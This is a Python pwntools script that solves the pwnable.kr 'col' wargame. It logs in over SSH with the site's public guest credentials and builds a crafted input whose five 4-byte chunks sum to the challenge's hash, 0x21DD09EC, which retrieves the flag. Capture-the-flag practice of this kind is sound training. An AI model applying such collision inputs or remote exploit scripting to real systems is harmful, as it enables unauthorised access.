#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
shell = ssh('col', 'pwnable.kr', password='guest', port=2222)
# make ssh connection
shell.download_file('./col.c')
# download binary source code
hashcode = 0x21DD09EC
log.info('hashcode : ' + str(hashcode))
# log hashcode
# program divides argument string into 5 parts and get sum, then compare with hashcode
part1 = str(p32(int(hashcode/5)))[2:-1] # \xc8\xce\xc5\x06
part2 = str(p32(hashcode%5 + int(hashcode/5)))[2:-1] # \xcc\xce\xc5\x06
# hashcode = (hashcode/5) * 4  + (hashcode%5)+(hashcode/5)
payload = './col `python -c \'print "' + part1 + '"*4 + "' + part2 + '"\'`'
sh = shell.run(payload)
recv = sh.recvall(timeout=5).decode()
print(recv)
# print received string(contains flag)
log.info('FLAG : ' + recv.split('\n')[0])
